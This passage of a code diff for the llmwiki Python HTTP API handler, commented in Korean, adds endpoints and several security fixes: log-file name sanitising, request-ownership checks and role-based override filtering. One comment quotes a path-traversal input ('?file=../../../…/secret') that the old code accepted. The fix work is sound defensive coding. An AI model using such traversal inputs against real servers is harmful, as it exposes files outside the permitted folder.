+                            "relations": [{"src": ents[r.src].name if r.src in ents else r.src, "rel": r.rel,
+                                           "dst": ents[r.dst].name if r.dst in ents else r.dst,
+                                           "provenance": r.provenance, "weight": r.weight} for r in rels],
+                            "unknown_rels": ex.schema.unknown_rels, "unknown_types": ex.schema.unknown_types})
+                    return self._json({
+                        "entity_types": gr_types, "value_types": _gr.describe_value_types(),
+                        "relations": gr_schema.relations, "on_unknown": gr_schema.on_unknown,
+                        "entities": [{"name": k, "type": (v or {}).get("type"), "aliases": (v or {}).get("aliases") or []}
+                                     for k, v in (gr_rules.get("entities") or {}).items()],
+                        "counts": {k: len(gr_rules.get(k) or []) for k in ("relation_patterns", "chunk_values", "id_patterns", "link_rules")},
+                        "path": _gr.rules_path(),
+                        "cli": "python -m llmwiki graph-rules types|lint|test \"<문장>\""})
                 if u.path == "/api/rules":
                     from ..graph_rules import load_rules
                     return self._json(load_rules())
@@ -791,6 +1122,10 @@ class Handler(BaseHTTPRequestHandler):
                     return self._json(run_health(p, quick=qs.get("quick", "0") in ("1", "true"), for_build=qs.get("for_build", "0") in ("1", "true")))
                 if u.path == "/api/config/effective":
                     return self._json(effective_settings(p.s))
+                if u.path == "/api/env":
+                    # .env 가시성 (admin — classify_api 가 GET /api/env 를 admin 으로 둔다): 키 이름·설정 여부·마스킹 값·LLMWIKI_* 오버라이드
+                    from ..config import env_report as _env_report
+                    return self._json(_env_report())
                 if u.path == "/api/presets":
                     from .. import presets as _presets
                     return self._json({"presets": _presets.load_presets(), "path": _presets.presets_path()})
@@ -806,11 +1141,18 @@ class Handler(BaseHTTPRequestHandler):
                 if u.path == "/api/logs/files":
                     from .. import logging_setup as _ls
                     d = _ls.log_dir() or path_for("logs_dir")
-                    return self._json({"dir": d, "files": _ls.files(d)})
+                    return self._json({"dir": d, "files": _ls.files(d), "quota": _ls.check_quota(force=True, dir_hint=d)})
                 if u.path == "/api/logs":
                     from .. import logging_setup as _ls
                     d = _ls.log_dir() or path_for("logs_dir")
-                    path = os.path.join(d, (qs.get("file") or "llmwiki") + ".log")
+                    # `file` 은 로그 폴더 안의 **이름**이지 경로가 아니다. 예전에는 그대로 join 해서
+                    # `?file=../../../어딘가/secret` 로 폴더 밖의 .log 파일을 읽을 수 있었다 (GET 은 read 등급 = 익명).
+                    name = os.path.basename(str(qs.get("file") or "llmwiki")).strip()
+                    if not re.fullmatch(r"[A-Za-z0-9._-]{1,64}", name or ""):
+                        return self._json({"error": "로그 파일 이름이 올바르지 않습니다 (영문·숫자·. _ - 만)", "file": qs.get("file")}, 400)
+                    path = os.path.join(d, name + ".log")
+                    if os.path.normpath(os.path.abspath(path)).lower() != os.path.normpath(os.path.join(os.path.abspath(d), name + ".log")).lower():
+                        return self._json({"error": "로그 폴더 밖은 읽을 수 없습니다"}, 400)
                     run_id = qs.get("run") or ""
                     if qs.get("request"):
                         r = p.store.get_request(int(qs["request"]))
@@ -828,8 +1170,16 @@ class Handler(BaseHTTPRequestHandler):
                         rows = _ls.grep(path, run_id=run_id or None, text=qs.get("text") or None, level=qs.get("level") or None, since_s=since_s, limit=n)
                     return self._json({"file": path, "rows": rows})
                 if u.path == "/api/forensics":
+                    # 기본을 **문제 건만**으로 둔다 (`only=problems`). 이 저장소 실측으로 기록 1,122건 중
+                    # 1,025건이 정상이라, 최근 N건을 그냥 보여 주면 "왜 부실했나" 를 보러 온 사람이
+                    # 찾는 것을 하나도 못 본다. `only=all` 이면 전부 — CLI `forensic list --only` 와 같다.
                     from .. import forensic as _fx
-                    return self._json(_fx.list_forensics(p.store, _qint(qs, "limit", 50)))
+                    only = (qs.get("only") or "problems").strip()
+                    return self._json(_fx.list_forensics(
+                        p.store, _qint(qs, "limit", 50),
+                        verdict=(qs.get("verdict") or None),
+                        q=(qs.get("q") or ""),
+                        only_problems=(only not in ("all", "") and not qs.get("verdict"))))
                 if u.path == "/api/forensics/summary":
                     from .. import forensic as _fx
                     return self._json(_fx.summary(p.store))
@@ -866,13 +1216,39 @@ class Handler(BaseHTTPRequestHandler):
                     return self._json(_pins.load_pins())
                 if u.path == "/api/query_rules":
                     from .. import query_rules as _qr
-                    return self._json({"rules": _qr.load_rules(), "path": _qr.rules_path(), "stats": _qr.stats()})
+                    # `types` 는 화면이 절 이름을 하드코딩하지 않게 해 준다 — 유형을 늘려도 UI 가 따라온다.
+                    return self._json({"rules": _qr.load_rules(), "path": _qr.rules_path(), "stats": _qr.stats(),
+                                       "types": _qr.describe_types()})
                 if u.path == "/api/query_rules/test":
                     from .. import query_rules as _qr
                     return self._json(_qr.expand(qs.get("q", ""), _tuning.T.get("syn_w"), _tuning.T.get("related_w"), _tuning.T.get("acronym_phrase")))
+                if u.path == "/api/eval/candidates":
+                    # **비교에 쓸 과거 질의 고르기** (2026-09-20). 기간·건수·피드백으로 추린 후보를
+                    # 돌려주고, 사람이 그중에서 고른다 — 고르지 못하면 비교가 관심사와 상관없는
+                    # 문항 위에서 돈다. CLI `trial candidates` 와 같은 함수.
+                    from ..evalset import from_query_log as _fq
+                    got = _fq(p.store, days=float(qs.get("days") or 7),
+                              limit=_qint(qs, "limit", 50), only=str(qs.get("only") or ""))
+                    return self._json({"candidates": got["questions"], "source": got["source"]})
+                if u.path == "/api/eval/check":
+                    # 점수를 내기 전에 "이 숫자를 믿어도 되나" — 평가셋 오염·기대 문서 누락·표본 크기.
+                    # LLM 을 부르지 않으므로 빠르다 (읽기 등급).
+                    from ..evalset import health as _eh
+                    return self._json(_eh(p))
                 if u.path == "/api/query_rules/lint":
                     from .. import query_rules as _qr
                     return self._json(_qr.lint())
+                if u.path == "/api/query_rules/effect":
+                    # 규칙별 누적 효과 (발화·후보·기여·인용) — 어떤 규칙이 실제로 답에 도움이 됐나
+                    from .. import ruleeffect as _re
+                    return self._json(_re.stats(p.store, _qint(qs, "limit", 200), str(qs.get("order") or "fired")))
+                if u.path == "/api/query_rules/explain":       # 이 말이 어느 유형·방향으로 무엇을 끌어오나 (읽기, §2.4)
+                    from .. import query_rules as _qr
+                    term = str(qs.get("term") or "").strip()
+                    if not term:
+                        # 빈 term 에 200 + 빈 껍데기를 주면 화면이 "규칙이 없다" 로 잘못 읽는다 (CLI `rules explain` 도 용어를 요구한다)
+                        return self._json({"error": "term 이 필요합니다 — 예: /api/query_rules/explain?term=PDCCH", "code": "bad_request"}, 400)
+                    return self._json(_qr.explain(term))
                 # ---------------- 협업 (휘발성 채팅 · 게시판) — 부수 기능: 꺼져 있으면 404 ----------------
                 if u.path in ("/api/collab", "/api/collab/board"):
                     from .. import collab as _cb
@@ -912,8 +1288,16 @@ class Handler(BaseHTTPRequestHandler):
                     from .. import memory as _mem
                     # status() 의 episodes 는 '개수' 다. 예전에는 같은 키에 목록을 덮어써서 화면에
                     # 개수 자리에 '[object Object],[object Object]…' 가 찍혔다 (2026-09-16).
-                    return self._json(dict(_mem.status(p.store, _tuning.T.get("memory_half_life_days")),
-                                           recent=_mem.episodes(p.store, _qint(qs, "limit", 20))))
+                    _hl = _tuning.T.get("memory_half_life_days")
+                    return self._json(dict(
+                        _mem.status(p.store, _hl),
+                        recent=_mem.episodes(p.store, _qint(qs, "limit", 20), str(qs.get("only") or ""), str(qs.get("q") or "")),
+                        # 2026-09-19: 숫자만 있고 내용이 없던 두 가지를 목록으로 — "내 피드백이 반영됐나",
+                        # "제안이 왜 사라졌지" 가 이 화면에서 답이 되게 한다 (docs/EVOLVE.md §메모리).
+                        boosts=_mem.boost_table(p.store, _hl, top=_qint(qs, "boosts", 30)),
+                        decaying=_mem.decaying_proposals(p.store, _hl, _tuning.T.get("memory_archive_strength"),
+                                                         _qint(qs, "decaying", 20)),
+                        archive_strength=_tuning.T.get("memory_archive_strength")))
                 if u.path == "/api/precompute":
                     from .. import precompute as _pc
                     return self._json(_pc.cache_status(p.store))
@@ -946,10 +1330,12 @@ class Handler(BaseHTTPRequestHandler):
             self._rejected(e)
         except _pg.Cancelled as e:
             self._json({"error": "cancelled: %s" % e, "cancelled": True}, 499)
+        except AuthError as e:      # 디스패치 안의 거부 (요청 단위 overrides 화이트리스트 등) → 401/403, 500 이 아니다
+            self._deny(e, None, u.path, "?")
         except (BadRequest, TypeError, AttributeError, ValueError, KeyError, OverflowError) as e:
             self._bad_request(u.path, e)
         except Exception as e:
-            self._json({"error": str(e), "trace": traceback.format_exc()}, 500)
+            self._server_error(u.path, e)
 
     def _bad_request(self, path: str, e: BaseException) -> None:
         """입력 모양이 잘못된 요청은 400 으로 돌려준다 (500 은 서버 결함만). 원인은 로그에 남겨 진짜 버그를 놓치지 않는다."""
@@ -1110,6 +1496,30 @@ class Handler(BaseHTTPRequestHandler):
                 return self._json({"error": str(e)}, 400)
             auth.audit(user, "security " + act, level, True, self._ip(), detail={k: v for k, v in body.items() if k not in ("_password",)})
             return self._json(out)
+        if u.path == "/api/docacl":
+            # 문서 단위 접근 제어의 규칙 저장 · 영향 확인 (CLI `security docacl check` 와 같은 함수)
+            from .. import docacl as _dacl
+            act = body.get("action") or "check"
+            if act == "check":
+                # (이 메서드에서 `p` 는 뒤쪽에서야 바인딩된다 — self.pipe 를 직접 쓴다)
+                return self._json(_dacl.check(self.pipe.store, str(body.get("role") or "viewer"),
+                                              int(body.get("sample") or 200)))
+            if act == "save":
+                cur = _dacl.load()
+                new = dict(cur)
+                for k in ("enabled", "default_min_role", "rules", "deny_message"):
+                    if k in body:
+                        new[k] = body[k]
+                bad = [r for r in (new.get("rules") or [])
+                       if not isinstance(r, dict) or not str(r.get("prefix") or "").strip()
+                       or str(r.get("min_role") or "viewer") not in ROLES]
+                if bad:
+                    return self._json({"error": "규칙이 올바르지 않습니다", "detail": "prefix 는 비울 수 없고 min_role 은 %s 중 하나여야 합니다" % ", ".join(ROLES), "bad": bad[:5]}, 400)
+                path = _dacl.save(new)
+                auth.audit(user, "docacl save", level, True, self._ip(),
+                           detail={"rules": len(new.get("rules") or []), "default_min_role": new.get("default_min_role"), "enabled": new.get("enabled")})
+                return self._json({"ok": True, "path": path, **_dacl.describe(_dacl.load(force=True))})
+            return self._json({"error": "unknown action"}, 400)
         if u.path == "/api/apikeys":
             act = body.get("action") or "list"
             try:
@@ -1262,9 +1672,11 @@ class Handler(BaseHTTPRequestHandler):
 
     def _dispatch_post(self, u, body: Dict[str, Any]) -> None:
         p = self.pipe
-        ov = _as_dict(body.get("overrides"), "overrides")   # 문자열·숫자 등이 오면 400 (예전에는 500 이었다)
-        actor = str(body.get("_actor") or "")
         client = body.get("_client") or {}
+        ov = _as_dict(body.get("overrides"), "overrides")   # 문자열·숫자 등이 오면 400 (예전에는 500 이었다)
+        ov = _filter_overrides(ov, str(client.get("role") or ""), u.path)   # 역할이 못 쓰는 키(URL·경로·운영) → 403
+        body["overrides"] = ov                               # 잡(빌드·평가)도 걸러진 사본만 본다
+        actor = str(body.get("_actor") or "")
         level = str(body.get("_level") or "read")
         op = str(body.get("_op") or u.path)
         mgr = _mgr()
@@ -1280,6 +1692,44 @@ class Handler(BaseHTTPRequestHandler):
                                                   weight="exclusive" if full else "soft", build_mode="full" if full else "incremental"))
             if u.path == "/api/eval":
                 return self._json(self._start_job("eval", lambda progress: self._do_eval(body, progress), client=client, weight="read"))
+            if u.path == "/api/sweep":
+                # 파라미터 스윕 (llmwiki/sweep.py · docs/SWEEP.md): 값마다 /api/query/rerun 과 같은 경로로 재생 → 잡.
+                # 결과 job.result = {"record", "compare", "text"}. 등급은 재실행과 같은 read (auth._READ_POST).
+                from .. import sweep as _sw, rerun as _rr
+                act = str(body.get("action") or "run")
+                if act != "run":
+                    return self._json({"error": "unknown action (run 만)"}, 400)
+                key = _as_str(body.get("key"), "key").strip()
+                if not key:
+                    return self._json({"error": "key 가 필요합니다 (GET /api/sweep/keys 의 목록에서)"}, 400)
+                rid = body.get("request_id")
+                q = _as_str(body.get("query"), "query").strip()
+                if rid in (None, "") and not q:
+                    return self._json({"error": "request_id(또는 last) 나 query 가 필요합니다"}, 400)
+                point = _as_str(body.get("from"), "from").strip() or None
+                if point and point not in _rr.POINT_IDS:
+                    return self._json({"error": "from 은 %s 중 하나여야 합니다" % ", ".join(_rr.POINT_IDS)}, 400)
+                try:
+                    info = _sw.classify_key(key)
+                    spec = {"range": body.get("range")} if body.get("range") not in (None, "") else ({"values": body.get("values")} if body.get("values") is not None else None)
+                    vals = _sw.resolve_values(key, spec, int(getattr(p.s, "sweep_max_values", 20) or 20))
+                except ValueError as e:
+                    return self._json({"error": str(e)}, 400)
+                if info["kind"] in ("config", "role"):
+                    _filter_overrides({info["key"]: vals[0]}, str(client.get("role") or ""), u.path)   # 역할이 못 쓰는 키(URL·경로·운영) → 403
+                repeats = max(1, min(_as_int(body.get("repeats"), "repeats", 1), _sw.MAX_REPEATS))
+                llm = _as_dict(body.get("llm"), "llm")
+                if llm:
+                    _filter_overrides({"llm_roles": llm}, str(client.get("role") or ""), u.path)
+                label = "스윕 %s ← %s" % (info["key"], ("#%s" % rid) if rid not in (None, "") else "새 질의")
+                do_log = bool(body.get("log", False))
+
+                def _run_sweep(progress, rid=rid, key=key, vals=vals, repeats=repeats, point=point, llm=llm, q=q, ov=ov, do_log=do_log):
+                    rec = _sw.run(p, rid if rid not in (None, "") else None, key, vals, repeats=repeats, from_point=point, llm=llm or None,
+                                  query=q or None, progress=progress, overrides=ov or None, log=do_log)
+                    cmp_ = _sw.compare(rec)
+                    return {"record": rec, "compare": cmp_, "text": _sw.render_text(rec, cmp_)}
+                return self._json(self._start_job("sweep", _run_sweep, label=label, client=client, weight="read"))
             if u.path == "/api/query/rerun":
                 # 저장해 둔 중간 결과로 **특정 단계부터** 다시 (docs/RERUN.md).
                 # 일반 질의와 같은 티켓·같은 request_scope 를 쓴다 — 재실행만 다른 길을 타면 결과를 믿을 수 없다.
@@ -1288,13 +1738,21 @@ class Handler(BaseHTTPRequestHandler):
                 point = _as_str(body.get("from"), "from", "answer_llm")
                 if rid in (None, ""):
                     return self._json({"error": "request_id 가 필요합니다"}, 400)
+                # 남의 request_id 로 재실행하면 그 사람의 질의와 근거를 그대로 받아 본다 (id 는 순차 정수 = 열거 가능).
+                try:
+                    _rec = p.store.get_request(int(rid), archive_dir=p.s.requests_archive_dir())
+                except (TypeError, ValueError):
+                    _rec = None
+                if self._not_my_request(_rec, User(str(client.get("user") or ""), str(client.get("role") or "viewer"), ""), self._auth()):
+                    return self._json({"error": "다른 사용자의 요청입니다 (전체 조회 권한 필요: 작업 'requests all')"}, 403)
                 if point not in _rr.POINT_IDS:
                     return self._json({"error": "from 은 %s 중 하나여야 합니다" % ", ".join(_rr.POINT_IDS)}, 400)
                 names = [x for x in str(_as_str(body.get("preset"), "preset")).replace(";", ",").split(",") if x.strip()]
                 label = "재실행 %s ← #%s" % (point, rid)
                 with mgr.ticket("query", "read", client=client, label=label, token=str(body.get("progress_token") or "")[:64] or None) as tk:
                     try:
-                        with p.request_scope(overrides=ov or None, presets=names, mode=_as_str(body.get("mode"), "mode")):
+                        with p.request_scope(overrides=ov or None, presets=names, mode=_as_str(body.get("mode"), "mode"),
+                                             actor=_actor_from_client(client)):     # 재실행도 문서 접근 제어를 받는다
                             res, tr = p.rerun(rid, point, log=bool(body.get("log", True)), debug=body.get("debug"))
                     except ValueError as e:
                         return self._json({"error": str(e), "points": _rr.POINTS}, 400)
@@ -1308,7 +1766,7 @@ class Handler(BaseHTTPRequestHandler):
                 # 클라이언트가 준 progress_token 이 곧 요청 관리자의 티켓 토큰 → GET /api/progress/<token> 으로 단계·대기열을 보고 DELETE 로 취소
                 tok = str(body.get("progress_token") or "")[:64] or None
                 with mgr.ticket("query", "read", client=client, label=q[:120], token=tok) as tk:
-                    out = self._do_query(body, q, ov)
+                    out = self._do_query(body, q, ov, actor=_actor_from_client(client))
                     r = out.get("result") if isinstance(out, dict) else None
                     if isinstance(r, dict):
                         # 1ms 만에 끝난 요청이 왜 그런지 활동 목록에서 바로 보이게 (실행이 안 된 것으로 오해하지 않도록)
@@ -1334,21 +1792,34 @@ class Handler(BaseHTTPRequestHandler):
                 lim = float((mgr.cfg.get("timeouts") or {}).get("job_s", 0) or 0)
             with mgr.ticket(kind, weight, client=client, label=op, timeout_s=lim,
                             build_mode="incremental" if weight == "soft" else ""):
+                if u.path == "/api/debug/query":
+                    # 질의 해부 (LLM 없음, 수 ms). CLI `inspect` · MCP wiki_inspect 와 같은 함수.
+                    from .. import querydebug as _qd
+                    with _with_overrides(p, ov, actor=_actor_from_client(client)):
+                        return self._json(_qd.inspect_query(p, _as_str(body.get("q"), "q", "")))
                 if u.path == "/api/search":
-                    from ..retrieval import fts_search, vector_search, graph_search
-                    q, ch, k = body.get("q", ""), body.get("channel", "fts"), int(body.get("k", 8))
+                    # 채널 검색 디버그. channels(여러 개) + mode(or|and|rrf) 를 받는다.
+                    # 예전 형식(channel 하나)도 그대로 받아 준다 — CLI `search`, MCP wiki_search 와 같은 엔진이다.
+                    from ..retrieval import channel_search, parse_channels
+                    q = body.get("q", "")
+                    chans = parse_channels(body.get("channels") if body.get("channels") is not None else body.get("channel", "fts"))
+                    mode = str(body.get("mode") or "or").lower()
+                    k = int(body.get("k", 8))
                     prof = Profiler("search", debug=p.s.debug_level)
-                    with _with_overrides(p, ov):
-                        if ch == "fts":
-                            out = [{"chunk_id": c, "score": s, "snippet": sn} for c, s, sn in fts_search(p.store, q, k, p.store.synonyms(), prof)]
-                        elif ch == "vector":
-                            out = [{"chunk_id": c, "score": s} for c, s in vector_search(p.store, p.embedder, q, k, prof)]
-                        else:
-                            out = graph_search(p.store, q, k, p.s.graph_hops, prof)
+                    with _with_overrides(p, ov, actor=_actor_from_client(client)):
+                        out = channel_search(p.store, p.embedder, p.s, q, chans, mode=mode, k=k, prof=prof,
+                                             require=body.get("require"), exclude=body.get("exclude"),
+                                             acl=p.acl_filter(), doc_types=body.get("doc_types"))
                     tr = prof.finish()
-                    rid = p.store.log_request("search", "%s: %s" % (ch, q), tr, None, {"channel": ch, "k": k}, keep=p.s.keep_requests)
+                    label = "+".join(chans) + (("/" + out["mode"]) if len(chans) > 1 else "")
+                    rid = p.store.log_request("search", "%s: %s" % (label, q), tr, None,
+                                              {"channels": chans, "mode": out["mode"], "k": k,
+                                               "doc_types": out.get("doc_types") or []}, keep=p.s.keep_requests)
+                    dt = out.get("doc_types") or []
                     return self._json({"result": out, "trace": tr, "request_id": rid,
-                                       "cli": "python -m llmwiki search %s \"%s\" --k %d --json" % (ch, q, k)})
+                                       "cli": "python -m llmwiki search %s \"%s\" --mode %s --k %d%s --json"
+                                              % (",".join(chans), q, out["mode"], k,
+                                                 (" --doc-types " + ",".join(dt)) if dt else "")})
                 if u.path in ("/api/config", "/api/models/set"):
                     # action=reload: 파일을 **쓰지 않고** 디스크의 config.json 을 다시 읽어 들인다.
                     # 설정 파일을 서버 밖에서 고쳤을 때(배포 스크립트·에디터) 화면이 파일의 값과 달라 보이던 문제.
@@ -1365,11 +1836,52 @@ class Handler(BaseHTTPRequestHandler):
                 if u.path == "/api/models/test":
                     with _with_overrides(p, ov):
                         return self._json(p.test_providers(body.get("which"), live=bool(body.get("live"))))
+                if u.path == "/api/models/test_catalog":
+                    # 카탈로그(models.json) 의 enabled 모델 전부를 (provider, model) 로 ping — 계획 §0.1-d. CLI: models test --catalog [--live]
+                    with _with_overrides(p, ov):
+                        return self._json(p.test_catalog(live=bool(body.get("live")), kinds=body.get("kinds") or None))
+                if u.path == "/api/models/automap":
+                    # 연결되는 모델만 골라 역할에 자동 배정 (제안 → 적용). CLI: models automap [--live] [--apply]
+                    # apply=true 는 config.json 을 바꾸므로 '설정 저장' 등급이다 (classify_api 가 /api/models/* 를 그렇게 본다).
+                    with _with_overrides(p, ov):
+                        return self._json(p.automap_models(live=bool(body.get("live")), apply=bool(body.get("apply"))))
+                if u.path == "/api/env":
+                    # .env 다시 읽기 (admin): 파일 값으로 os.environ 을 덮어쓰고 설정을 다시 해석한다 (LLMWIKI_* 오버라이드·API 키가 바뀐다). CLI: config reload --env
+                    from ..config import reload_env as _reload_env, load_settings as _load_settings
+                    if _as_str(body.get("action"), "action", "reload") != "reload":
+                        return self._json({"error": "unknown action (reload)"}, 400)
+                    rep = _reload_env()
+                    p.s = _load_settings()
+                    p.reload()
+                    rep["ok"] = True
+                    return self._json(rep)
                 if u.path == "/api/maintenance":
                     return self._json(p.maintenance(body.get("action", "")))
+                if u.path == "/api/reset":
+                    # 관리자 초기화 실행. 등급은 destructive — 확인 문구 + 비밀번호 재입력 모달이 먼저 뜬다
+                    # (auth._DESTRUCTIVE_POST). 미리보기는 GET /api/reset?scope=… 이다.
+                    from .. import reset as _rs
+                    sc = _as_str(body.get("scope"), "scope", "")
+                    if sc not in _rs.SCOPES:
+                        return self._json({"error": "scope 는 %s 중 하나입니다" % " | ".join(_rs.SCOPES)}, 400)
+                    r = _rs.run(p, sc, actor=actor,
+                                snapshot=body.get("snapshot", True) is not False,
+                                keep_wiki_notes=not body.get("purge_wiki_notes"),
+                                clear_embed_cache=bool(body.get("clear_embed_cache")),
+                                include_security=bool(body.get("include_security")),
+                                include_env=bool(body.get("include_env")),
+                                include_proposals=bool(body.get("include_proposals")),
+                                include_sessions=bool(body.get("include_sessions")))
+                    r["cli"] = "python -m llmwiki reset %s --apply" % sc
+                    return self._json(r)
                 if u.path == "/api/tuning":
                     act = _as_str(body.get("action"), "action", "set")
                     errors = {}
+                    if act == "reload":
+                        # 파일을 쓰지 않고 디스크의 tuning.json 을 다시 읽는다 (서버 밖에서 고쳤을 때). 예전에는 config reload 를 눌러야 했다.
+                        p.reload_tuning()
+                        return self._json({"ok": True, "reloaded": True, "path": _tuning.TUNING_PATH, "overrides": _tuning.T.to_dict(),
+                                           "tunables": _tuning.T.describe(p.s)})
                     if act == "reset":
                         _tuning.T.reset(_as_str(body.get("key"), "key") or None)
                     else:
@@ -1424,14 +1936,44 @@ class Handler(BaseHTTPRequestHandler):
                         return self._json(ev.llm_review(p))
                 if u.path == "/api/evolve/propose":
                     kind = _as_str(body.get("kind"), "kind")
-                    if not kind:
-                        raise BadRequest("kind 가 필요합니다 (corpus_gap | query_rule | tuning | pin | synonym …)")
+                    # 적용할 수 없는 종류를 받아 두면 나중에 apply 에서 "unknown kind" 로 실패한 채 큐에 남는다.
+                    # 받는 자리에서 evolve.KINDS 로 막는다 (Web·MCP·CLI 가 같은 목록을 본다).
+                    if not kind or kind not in ev.KINDS:
+                        raise BadRequest("kind 는 %s 중 하나여야 합니다 (받은 값: %r)" % (" | ".join(sorted(ev.KINDS)), kind))
                     try:
                         conf = float(body.get("confidence", 0.9))
                     except (TypeError, ValueError):
                         raise BadRequest("confidence 는 숫자여야 합니다")
                     pid = p.store.add_proposal(kind, _as_dict(body.get("payload"), "payload"), _as_str(body.get("reason"), "reason", "manual"), conf, "manual")
                     return self._json({"id": pid})
+                if u.path == "/api/evolve/auto_apply":
+                    # 스케줄러의 auto_apply 를 손으로 한 번 (신뢰도 하한 · 종류 제한 · 건수 상한 · 미리보기)
+                    allow = body.get("kinds") or ev.auto_apply_kinds(p.s)
+                    if isinstance(allow, str):
+                        allow = [x.strip() for x in allow.split(",") if x.strip()]
+                    try:
+                        min_conf = float(body.get("min_confidence", p.s.evolve_min_confidence or 0.9))
+                        limit = int(body.get("max_apply", 5))
+                    except (TypeError, ValueError):
+                        raise BadRequest("min_confidence 는 숫자, max_apply 는 정수여야 합니다")
+                    dry = bool(body.get("dry_run"))
+                    evaluate = bool(body.get("evaluate", True))
+                    picked, applied, errors = [], [], []
+                    for pr in p.store.proposals("proposed"):
+                        if len(picked) >= limit:
+                            break
+                        if float(pr.get("confidence") or 0) < min_conf or pr.get("kind") not in allow:
+                            continue
+                        picked.append({"id": pr["id"], "kind": pr["kind"], "confidence": pr["confidence"]})
+                    if not dry:
+                        for pr in picked:
+                            try:
+                                r = ev.apply_proposal(p, int(pr["id"]), evaluate=evaluate)
+                                applied.append({"id": pr["id"], "kind": pr["kind"], "status": r.get("status")})
+                            except Exception as e:
+                                errors.append({"id": pr["id"], "error": str(e)[:200]})
+                    return self._json({"picked": picked, "applied": applied, "errors": errors,
+                                       "min_confidence": min_conf, "kinds": allow, "dry_run": dry, "evaluate": evaluate})
                 if u.path == "/api/wiki/page":
                     name = body.get("name", "")
                     if not name or "/" in name or "\\" in name:
@@ -1445,12 +1987,59 @@ class Handler(BaseHTTPRequestHandler):
                     argv = _as_argv(body.get("argv"))
                     if argv and argv[0] in ("serve", "watch", "mcp") and "--once" not in argv:
                         return self._json({"code": 1, "output": "%s 는 콘솔에서 실행할 수 없습니다 (서버가 이미 실행 중; watch 는 --once 로)." % argv[0]})
-                    return self._json(run_captured(argv, p.s, p, actor=str(body.get("_actor") or "web")))
+                    # 콘솔에서 돌린 `query`·`search`·`docs` 도 **콘솔을 연 사람의 신분**으로 돈다.
+                    # 신분을 주지 않으면 pipe.actor 기본값이 admin 이라, viewer 가 콘솔 한 줄로 등급 문서를 읽을 수 있었다.
+                    with p.request_scope(actor=_actor_from_client(client)):
+                        return self._json(run_captured(argv, p.s, p, actor=str(body.get("_actor") or "web")))
                 if u.path == "/api/rules":
-                    from ..graph_rules import save_rules
-                    save_rules(_as_dict(body.get("rules"), "rules"))
+                    from .. import graph_rules as _gr
+                    new_rules = _as_dict(body.get("rules"), "rules")
+                    # 저장 전에 정적 점검 — 깨진 정규식 하나가 빌드 전체를 멈추기 때문이다.
+                    # 오류가 있으면 막고 이유를 돌려준다 (`force: true` 로 넘길 수 있다 — 고치는 중간 상태 저장용).
+                    chk = _gr.lint(new_rules)
+                    errs = [i for i in chk["issues"] if i["level"] == "error"]
+                    if errs and not body.get("force"):
+                        return self._json({"error": "규칙에 오류 %d건이 있어 저장하지 않았습니다" % len(errs),
+                                           "issues": chk["issues"], "hint": "force:true 로 강제 저장할 수 있습니다"}, 400)
+                    _gr.save_rules(new_rules)
                     p.reload()
-                    return self._json({"ok": True})
+                    return self._json({"ok": True, "issues": chk["issues"], "counts": chk["counts"]})
+                if u.path == "/api/graph_rules":
+                    # 사전 편집 (엔티티/별칭 추가) — CLI `graph-rules add-entity|add-alias` 와 같은 동작
+                    from .. import graph_rules as _gr
+                    act = str(body.get("action") or "")
+                    gr_rules = _gr.load_rules()
+                    ents = gr_rules.setdefault("entities", {})
+                    name = str(body.get("name") or "").strip()
+                    if act == "add_entity":
+                        types = _gr.known_types(gr_rules)
+                        etype = str(body.get("type") or "concept").strip()
+                        if not name:
+                            return self._json({"error": "이름이 비었습니다"}, 400)
+                        if types and etype not in types:
+                            return self._json({"error": "없는 type '%s'" % etype, "types": types}, 400)
+                        if name in ents:
+                            return self._json({"error": "이미 있습니다: %s" % name}, 400)
+                        ents[name] = {"type": etype, "aliases": [str(a).strip() for a in (body.get("aliases") or []) if str(a).strip()]}
+                        _gr.save_rules(gr_rules)
+                        p.reload()
+                        return self._json({"ok": True, "name": name, "rebuild": "build graph"})
+                    if act == "add_alias":
+                        key = next((k for k in ents if str(k).strip().lower() == name.lower()), None)
+                        if key is None:
+                            return self._json({"error": "규칙 사전에 '%s' 가 없습니다" % name}, 400)
+                        cur = list(ents[key].get("aliases") or [])
+                        add = [str(a).strip() for a in (body.get("aliases") or [])
+                               if str(a).strip() and str(a).strip() not in cur and str(a).strip().lower() != key.lower()]
+                        ents[key]["aliases"] = cur + add
+                        _gr.save_rules(gr_rules)
+                        p.reload()
+                        return self._json({"ok": True, "entity": key, "added": add, "rebuild": "build graph"})
+                    if act == "fill_defaults":
+                        rep = _gr.fill_defaults()
+                        p.reload()
+                        return self._json(rep)
+                    return self._json({"error": "action 은 add_entity | add_alias | fill_defaults"}, 400)
                 # ---------------- v3 ----------------
                 if u.path == "/api/presets":
                     from .. import presets as _presets
@@ -1596,14 +2185,43 @@ class Handler(BaseHTTPRequestHandler):
                     from .. import trials as _tr
                     act = body.get("action", "run")
                     if act == "run":
-                        qs_ = load_questions(body["questions"]) if body.get("questions") else None
+                        # 문항 원천: evalset(기본) | queries(기간·조건으로 추린 질의 이력)
+                        #          | list(**사람이 고른** 질의 이력, `pick`=query_log.id 목록)
+                        # CLI `trial run --source` · `--pick` 과 같다.
+                        src = None
+                        # 기본은 **실제 질의 이력** (CLI `--source` 기본과 같다). 대개 알고 싶은 것은
+                        # "진짜로 물어본 질문에서 좋아졌나" 이고, 이 저장소에서는 평가셋이 코퍼스에
+                        # 색인돼 hit@k 가 오염돼 있다(`eval --check`).
+                        srck = str(body.get("source") or "queries")
+                        pick = body.get("pick") or []
+                        if srck == "list" or pick:
+                            from ..evalset import pick_questions
+                            got = pick_questions(p.store, pick)
+                            qs_, src = got["questions"], got["source"]
+                            if not qs_:
+                                return self._json({"error": "고른 질의가 없습니다 — 아래 목록에서 비교할 질의를 고르세요"}, 400)
+                        elif srck == "queries":
+                            from ..evalset import from_query_log
+                            got = from_query_log(p.store, days=float(body.get("days") or 7),
+                                                 limit=int(body.get("limit") or 30), only=str(body.get("only") or ""))
+                            qs_, src = got["questions"], got["source"]
+                            if not qs_:
+                                # 기본값이 실행을 막으면 안 된다 — 평가셋으로 물러나되 **어느 원천인지 알린다**
+                                qs_, src = None, None
+                        else:
+                            qs_ = load_questions(body["questions"]) if body.get("questions") else None
                         ovr = body.get("sets") or None
                         name = body.get("name") or ("trial-%s" % time.strftime("%m%d-%H%M%S"))
 
-                        def _run(progress, name=name, qs_=qs_, ovr=ovr):
-                            progress("trial %s 시작" % name)
+                        SRCN = {"queries": "실제 질의 이력", "list": "직접 고른 질의"}
+
+                        def _run(progress, name=name, qs_=qs_, ovr=ovr, src=src):
+                            progress("trial %s 시작 — 문항 원천: %s"
